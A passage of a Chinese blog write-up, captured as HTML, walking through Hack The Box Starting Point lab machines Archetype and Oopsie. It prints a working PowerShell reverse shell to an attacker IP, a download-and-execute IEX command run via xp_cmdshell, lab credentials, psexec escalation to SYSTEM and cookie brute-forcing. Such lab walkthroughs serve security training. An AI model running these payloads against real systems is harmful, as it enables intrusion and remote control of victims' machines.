再怎么弄都不成功，本地搭的环境却可以，离谱，下一关。\n","wordCount":"1776","inLanguage":"en","datePublished":"2021-08-17T15:03:30+08:00","dateModified":"2021-08-17T15:03:30+08:00","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://examplesite.com/post/htb-starting-point/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://examplesite.com/ accesskey=h title="Home (Alt + H)">Home</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://examplesite.com/archives/ title=Archives>
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://examplesite.com/>Home</a>&nbsp;»&nbsp;<a href=https://examplesite.com/post/>Posts</a></div>
+<h1 class=post-title>
+HTB-Starting Point
+</h1>
+<div class=post-meta>August 17, 2021&nbsp;·&nbsp;0opsdc
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#archetype aria-label=Archetype>Archetype</a><ul>
+<li>
+<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=1、信息收集>1、信息收集</a></li>
+<li>
+<a href=#2%e6%8b%bfshell aria-label=2、拿Shell>2、拿Shell</a></li>
+<li>
+<a href=#3%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=3、获取用户权限>3、获取用户权限</a></li>
+<li>
+<a href=#4%e6%8f%90%e6%9d%83 aria-label=4、提权>4、提权</a></li></ul>
+</li>
+<li>
+<a href=#oopsie aria-label=Oopsie>Oopsie</a><ul>
+<li>
+<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-1 aria-label=1、信息收集>1、信息收集</a></li>
+<li>
+<a href=#2%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=2、获取用户权限>2、获取用户权限</a></li>
+<li>
+<a href=#3%e6%8f%90%e6%9d%83 aria-label=3、提权>3、提权</a><ul>
+<li>
+<a href=#%e6%96%b9%e6%b3%95%e4%b8%80 aria-label=方法一>方法一</a></li>
+<li>
+<a href=#%e6%96%b9%e6%b3%95%e4%ba%8c%e6%8e%a8%e8%8d%90 aria-label=方法二（推荐）>方法二（推荐）</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#accine aria-label=Accine>Accine</a><ul>
+<li>
+<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-2 aria-label=1、信息收集>1、信息收集</a></li>
+<li>
+<a href=#2%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90-1 aria-label=2、获取用户权限>2、获取用户权限</a></li>
+<li>
+<a href=#3%e6%8f%90%e6%9d%83-1 aria-label=3、提权>3、提权</a></li></ul>
+</li>
+<li>
+<a href=#shield aria-label=Shield>Shield</a><ul>
+<li>
+<a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-3 aria-label=1、信息收集>1、信息收集</a></li>
+<li>
+<a href=#2%e6%8b%bfwebshell aria-label=2、拿WebShell>2、拿WebShell</a>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h1 id=archetype>Archetype<a hidden class=anchor aria-hidden=true href=#archetype>#</a></h1>
+<blockquote>
+<p>目标：拿到用户权限与系统权限。</p>
+<p>靶机IP：10.10.10.27。</p>
+</blockquote>
+<h2 id=1信息收集>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集>#</a></h2>
+<p>先使用<code>nmap</code>看看靶机开放了什么端口：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.27
+
+<span style=color:#75715e># 参数讲解</span>
+sS：使用SYN半开放式扫描，扫描快，隐蔽性高
+sV：探测服务版本
+
+<span style=color:#75715e># 扫描结果</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.27 <span style=color:#f92672>(</span>10.10.10.27<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>996</span> closed ports
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server <span style=color:#ae81ff>2008</span> R2 - <span style=color:#ae81ff>2012</span> microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server <span style=color:#ae81ff>2017</span> 14.00.1000
+Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</code></pre></div><p>比较容易入手的就是<code>445端口</code>对应的<code>SMB服务</code>，<code>1433</code>是<code>SQL Server</code>的默认端口。先尝试能否匿名访问<code>SMB服务</code>，这里使用<code>Kali</code>预装的<code>smbclient</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbclient -N -L //10.10.10.27/
+
+<span style=color:#75715e># 参数讲解</span>
+N：匿名登录
+L：获取共享资源列表
+
+<span style=color:#75715e># 结果</span>
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backups         Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+</code></pre></div><p>获取到了共享资源列表，说明允许匿名访问<code>SMB服务</code>，文件夹后面的<code>$</code>代表为隐藏文件夹，接下来我们匿名登录看一下<code>backups</code>文件夹的内容：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbclient -N //10.10.10.27/backups
+
+<span style=color:#75715e># 列出当前目录下的文件</span>
+smb: <span style=color:#ae81ff>\&gt;</span> dir
+  .                                   D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
+  ..                                  D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
+  prod.dtsConfig                     AR      <span style=color:#ae81ff>609</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:23:02 <span style=color:#ae81ff>2020</span>
+
+		<span style=color:#ae81ff>10328063</span> blocks of size 4096. <span style=color:#ae81ff>8260548</span> blocks available
+
+<span style=color:#75715e># 下载prod.dtsConfig文件</span>
+smb: <span style=color:#ae81ff>\&gt;</span> get prod.dtsConfig
+getting file <span style=color:#ae81ff>\p</span>rod.dtsConfig of size <span style=color:#ae81ff>609</span> as prod.dtsConfig <span style=color:#f92672>(</span>0.5 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 0.5 KiloBytes/sec<span style=color:#f92672>)</span>
+</code></pre></div><p>下载的文件会默认存储在当前目录，查看<code>prod.dtsConfig</code>文件：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>vim prod.dtsConfig
+
+&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageName<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedDate<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;20.1.2019 10:01:34&#34;</span>/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Property&#34;</span> Path<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> ValueType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;String&#34;</span>&gt;
+        &lt;ConfiguredValue&gt;Data Source<span style=color:#f92672>=</span>.;Password<span style=color:#f92672>=</span>M3g4c0rp123;User ID<span style=color:#f92672>=</span>ARCHETYPE<span style=color:#ae81ff>\s</span>ql_svc;Initial Catalog<span style=color:#f92672>=</span>Catalog;Provider<span style=color:#f92672>=</span>SQLNCLI10.1;Persist Security Info<span style=color:#f92672>=</span>True;Auto Translate<span style=color:#f92672>=</span>False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt; 
+</code></pre></div><p>这个文件包含了一些数据库连接参数的配置，我们得到帐密<code>ARCHETYPE\sql_svc，M3g4c0rp123</code>。</p>
+<p><code>SQL Server</code>有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，<code>ARCHETYPE</code>代表主机名，<code>sql_svc</code>代表具有数据库登录权限的操作系统用户名，<code>M3g4c0rp123</code>就是密码。</p>
+<h2 id=2拿shell>2、拿Shell<a hidden class=anchor aria-hidden=true href=#2拿shell>#</a></h2>
+<p>根据<code>nmap</code>扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。</p>
+<p>需要的工具：<a href=https://github.com/SecureAuthCorp/impacket>SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)</a></p>
+<p>这是一个用<code>Python</code>编写的后工具集，本次渗透要用到其中的<code>mssqlclient.py</code>，安装过程不再赘述。</p>
+<p>使用操作系统身份验证登录数据库：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+
+<span style=color:#75715e># 输入密码后登录成功</span>
+<span style=color:#75715e># 数据库身份认证启用了TLS</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Encryption required, switching to TLS
+<span style=color:#75715e># 当前数据库为master</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>DATABASE<span style=color:#f92672>)</span>: Old Value: master, New Value: master
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>LANGUAGE<span style=color:#f92672>)</span>: Old Value: , New Value: us_english
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>PACKETSIZE<span style=color:#f92672>)</span>: Old Value: 4096, New Value: <span style=color:#ae81ff>16192</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed database context to <span style=color:#e6db74>&#39;master&#39;</span>.
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed language setting to us_english.
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ACK: Result: <span style=color:#ae81ff>1</span> - Microsoft SQL Server <span style=color:#f92672>(</span><span style=color:#ae81ff>140</span> 3232<span style=color:#f92672>)</span> 
+<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
+</code></pre></div><p>登录成功后使用<code>SQL Server</code>的<code>IS_SRVROLEMEMBER('sysadmin')</code>判断当前数据库用户是否具有<code>sysadmin</code>权限：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>SELECT</span> IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>)
+              
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
+<span style=color:#75715e>-----------   
+</span><span style=color:#75715e></span>
+          <span style=color:#ae81ff>1</span> 
+</code></pre></div><p>返回结果为1，代表当前数据库用户具有<code>sysadmin</code>权限，可进一步尝试使用<code>xp_cmdshell</code>实现<code>RCE</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#f92672>#</span> sp_configure修改数据库配置的存储过程<span style=color:#960050;background-color:#1e0010>，当</span><span style=color:#66d9ef>show</span> advanced options参数为1时<span style=color:#960050;background-color:#1e0010>，才能够修改数据库配置中的某些高级选项，其中就有</span>xp_cmdshell<span style=color:#960050;background-color:#1e0010>，因此需要先设置</span><span style=color:#66d9ef>show</span> advanced options参数
+<span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;show advanced options&#39;</span>, <span style=color:#ae81ff>1</span>
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span>sp_configure存储过程更改的配置选项
+reconfigure
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>使用</span>sp_configure存储过程启用xp_cmdshell参数<span style=color:#960050;background-color:#1e0010>，此参数启用后允许</span><span style=color:#66d9ef>SQL</span> Server调用操作系统命令
+<span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, <span style=color:#ae81ff>1</span>
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span> sp_configure存储过程更改的配置选项
+reconfigure
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>以上命令也可使用</span>mssqlclient的shell命令一步实现
+enable_xp_cmdshell
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+</code></pre></div><p>查看当前身份：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;whoami&#34;</span>
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
+<span style=color:#66d9ef>output</span>                                                                             
+
+<span style=color:#75715e>--------------------------------------------------------------------------------   
+</span><span style=color:#75715e></span>
+archetype<span style=color:#960050;background-color:#1e0010>\</span>sql_svc                                                                  
+
+<span style=color:#66d9ef>NULL</span> 
+</code></pre></div><p>查看是否存在开发环境：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;python&#34;</span>
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
+<span style=color:#66d9ef>output</span>                                                                             
+
+<span style=color:#75715e>--------------------------------------------------------------------------------   
+</span><span style=color:#75715e></span>
+<span style=color:#e6db74>&#39;python&#39;</span> <span style=color:#66d9ef>is</span> <span style=color:#66d9ef>not</span> recognized <span style=color:#66d9ef>as</span> an internal <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>external</span> command,                     
+
+operable program <span style=color:#66d9ef>or</span> batch file.                                                    
+
+<span style=color:#66d9ef>NULL</span> 
+</code></pre></div><h2 id=3获取用户权限>3、获取用户权限<a hidden class=anchor aria-hidden=true href=#3获取用户权限>#</a></h2>
+<p>根据之前<code>nmap</code>的扫描结果，靶机应该为<code>Windows Server 2008 R2</code>，在没有开发环境的情况下可以考虑从<code>powershell</code>入手，建立一个<code>powershell</code>的反向<code>shell</code>文件1.ps1：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$client = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;10.10.14.62&#34;</span>,443);
+$stream = $client.GetStream();
+<span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};
+<span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0)
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2&gt;&amp;1 | Out-String );
+$sendback2 = $sendback + <span style=color:#e6db74>&#34;# &#34;</span>;
+$sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()};
+$client.Close()
+</code></pre></div><p>保存完文件后，不要切换目录，在当前目录起一个<code>HTTP</code>服务器：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#ae81ff>80</span>
+</code></pre></div><p>开启本地监听：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvvp <span style=color:#ae81ff>443</span>
+</code></pre></div><p>在数据库中执行命令下载并执行脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;powershell &#34;</span>IEX (<span style=color:#66d9ef>New</span><span style=color:#f92672>-</span><span style=color:#66d9ef>Object</span> Net.WebClient).DownloadString(<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#e6db74>&#34;http://10.10.14.62/1.ps1\&#34;</span>);<span style=color:#e6db74>&#34;
+</span></code></pre></div><p>下载成功后可以看到<code>Web服务器</code>和<code>nc</code>都有对应的连接信息，切换到<code>nc</code>窗口，回车发现拿到了靶机的<code>shell</code>交互：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># 查看当前用户身份</span>
+whoami
+<span style=color:#75715e># 结果</span>
+archetype\sql_svc
+
+<span style=color:#75715e># 查看当前路径</span>
+pwd
+<span style=color:#75715e># 结果</span>
+Path               
+----               
+C:\Windows\system32
+
+<span style=color:#75715e># 查看桌面文件</span>
+dir C:\Users\sql_svc\Desktop
+
+
+    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Users\sql_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        2/25/2020   6<span style=color:#960050;background-color:#1e0010>:</span>37 AM             32 user.txt
+
+<span style=color:#75715e># 查看user.txt</span>
+type C:\Users\sql_svc\Desktop\user.txt
+</code></pre></div><h2 id=4提权>4、提权<a hidden class=anchor aria-hidden=true href=#4提权>#</a></h2>
+<p>查看<code>powershell</code>历史记录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+<span style=color:#75715e># 结果</span>
+net.exe use T: \\Archetype\backups /user<span style=color:#960050;background-color:#1e0010>:</span>administrator MEGACORP_4dm1n!!
+exit
+</code></pre></div><p>发现<code>administrator</code>将文件夹<code>\Archetype\backups</code>映射到<code>T盘</code>，<code>MEGACORP_4dm1n!!</code>为密码。</p>
+<p>尝试使用<code>impakcet</code>中的<code>psexec.py</code>提权：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 psexec.py administrator@10.10.10.27
+
+<span style=color:#75715e># 连接信息</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Requesting shares on 10.10.10.27.....
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Found writable share ADMIN$
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploading file TPMzHnhC.exe
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Opening SVCManager on 10.10.10.27.....
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating service yQAe on 10.10.10.27.....
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting service yQAe.....
+<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
+Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.17763.107<span style=color:#f92672>]</span>
+<span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2018</span> Microsoft Corporation. All rights reserved.
+
+<span style=color:#75715e># 查看当前身份</span>
+C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;whoami
+nt authority<span style=color:#ae81ff>\s</span>ystem
+
+<span style=color:#75715e># 查看桌面目录</span>
+dir C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
+<span style=color:#75715e># 结果</span>
+Directory of C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
+
+01/20/2020  06:42 AM    &lt;DIR&gt;          .
+01/20/2020  06:42 AM    &lt;DIR&gt;          ..
+02/25/2020  07:36 AM                <span style=color:#ae81ff>32</span> root.txt
+               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>32</span> bytes
+               <span style=color:#ae81ff>2</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  33,833,361,408 bytes free
+               
+<span style=color:#75715e># 查看root.txt</span>
+type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\r</span>oot.txt
+</code></pre></div><h1 id=oopsie>Oopsie<a hidden class=anchor aria-hidden=true href=#oopsie>#</a></h1>
+<blockquote>
+<p>目标：拿到用户权限与系统权限。</p>
+<p>靶机IP：10.10.10.28。</p>
+</blockquote>
+<h2 id=1信息收集-1>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-1>#</a></h2>
+<p><code>nmap</code>查看靶机信息：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.28
+
+<span style=color:#75715e># 结果</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.28 <span style=color:#f92672>(</span>10.10.10.28<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.37s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>开启22和80端口，直接访问网页，发现有一个登录关键字，但是没有对应的链接：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2009.30.19_2021%2009%2014%2009%2030%20.png alt="Screen Shot 2021-09-14 at 09.30.19">
+</p>
+<p>可能是将登录页面隐藏了，可通过两种方法进一步挖掘：</p>
+<p>1、<code>F12</code>打开控制台查看页面元素，翻到最下面可以发现一个登录页面的<code>js</code>脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/cdn-cgi/login/script.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
+</code></pre></div><p>2、<code>bp</code>抓包查看站点地图：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2009.37.49_2021%2009%2014%2009%2037%20.png alt="Screen Shot 2021-09-14 at 09.37.49">
+</p>
+<p>进入登录页面后尝试帐密<code>admin/MEGACORP_4dm1n!!</code>，密码为上一关获得的<code>administrator </code>的密码。</p>
+<p>登录成功后有一个文件上传功能，点击后显示<code>当前行为需要超级管理员权限</code>，抓包看一下当前的请求包：</p>
+<pre tabindex=0><code>GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+Host: 10.10.10.28
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.28/cdn-cgi/login/admin.php
+Connection: close
+Cookie: user=34322; role=admin
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre><p>发现<code>Cookie</code>处有一个<code>user</code>字段和<code>role</code>字段对当前身份进行判断，我们把当前数据包发送至<code>Inturder</code>模块，对<code>user</code>值爆破试试：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2009.56.31_2021%2009%2014%2009%2056%20.png alt="Screen Shot 2021-09-14 at 09.56.31">
+</p>
+<p>值为<code>86575</code>时，文件上传功能正常。</p>
